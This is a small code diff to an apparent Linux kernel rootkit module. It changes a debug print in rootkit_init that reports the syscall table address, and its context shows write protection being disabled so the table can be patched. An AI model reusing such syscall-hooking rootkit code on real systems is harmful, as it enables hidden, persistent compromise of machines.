@@ -436,7 +436,7 @@ int rootkit_init(void)
         goto out;    
     }
     
-    printk("Syscall table at %p %lu\n", syscall_table, read_cr0() & (~(X86_CR0_WP | X86_CR0_PE)));
+    printk("Syscall table at %p\n", syscall_table);
     
     // Disable write protection on page
     make_writeable();
